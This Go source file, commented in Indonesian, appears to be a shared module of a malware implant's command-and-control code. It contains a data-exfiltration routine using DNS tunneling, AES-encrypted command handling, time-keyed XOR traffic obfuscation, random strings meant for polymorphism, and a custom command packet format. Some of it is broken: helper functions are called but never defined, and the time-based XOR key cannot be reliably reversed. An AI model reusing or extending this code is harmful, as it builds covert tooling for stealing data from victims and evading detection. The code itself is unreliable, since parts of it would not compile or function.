package main

import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/binary"
    "time"
    "math/rand"
    "io"
    crand "crypto/rand"
)

// Fungsi obfuscasi lalu lintas dengan XOR dinamis
func obfuscateTraffic(data []byte) []byte {
    key := byte(time.Now().Unix() % 256)
    for i := range data {
        data[i] ^= key
    }
    return data
}

// Tambahkan di common.go
func generateRandomAlphanumeric(length int) string {
    // Untuk generate string acak untuk polymorphism
    chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result := make([]byte, length)
    for i := range result {
        result[i] = chars[rand.Intn(len(chars))]
    }
    return string(result)
}

// Tambahkan di common.go
func exfiltrateData(data string) error {
    // Enkripsi data sebelum dikirim
    encrypted := encrypt(data)
    // Gunakan channel tersembunyi seperti DNS tunneling
    return sendViaDNS(encrypted)
}

// Shared encryption functions (versi awal, tidak dihapus)
func encryptCommand(key []byte, cmd string) []byte {
    block, _ := aes.NewCipher(key)
    stream := cipher.NewCTR(block, make([]byte, 16))
    ciphertext := make([]byte, len(cmd))
    stream.XORKeyStream(ciphertext, []byte(cmd))
    return ciphertext
}

// Versi encryptCommand dengan obfuscasi tambahan
func encryptCommandObfuscated(key []byte, cmd string) []byte {
    block, _ := aes.NewCipher(key)
    ciphertext := make([]byte, aes.BlockSize+len(cmd))
    iv := ciphertext[:aes.BlockSize]
    io.ReadFull(crand.Reader, iv)
    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(ciphertext[aes.BlockSize:], []byte(cmd))
    return obfuscateTraffic(ciphertext)
}

func decryptCommand(key []byte, data []byte) string {
    block, _ := aes.NewCipher(key)
    stream := cipher.NewCTR(block, make([]byte, 16))
    plaintext := make([]byte, len(data))
    stream.XORKeyStream(plaintext, data)
    return string(plaintext)
}

// Binary protocol format:
// [MAGIC_BYTE][CHECKSUM][LENGTH][DATA...]
const MAGIC_BYTE = 0xBB

func createBinaryPacket(cmd string) []byte {
    checksum := crc32Checksum([]byte(cmd))
    length := uint16(len(cmd))

    packet := make([]byte, 1+4+2+len(cmd))
    packet[0] = MAGIC_BYTE
    binary.BigEndian.PutUint32(packet[1:5], checksum)
    binary.BigEndian.PutUint16(packet[5:7], length)
    copy(packet[7:], []byte(cmd))

    return packet
}

func crc32Checksum(data []byte) uint32 {
    // Implementasi CRC32 sederhana
    var crc uint32 = 0xFFFFFFFF
    for _, b := range data {
        crc ^= uint32(b)
        for i := 0; i < 8; i++ {
            if crc&1 == 1 {
                crc = (crc >> 1) ^ 0xEDB88320
            } else {
                crc >>= 1
            }
        }
    }
    return ^crc
}
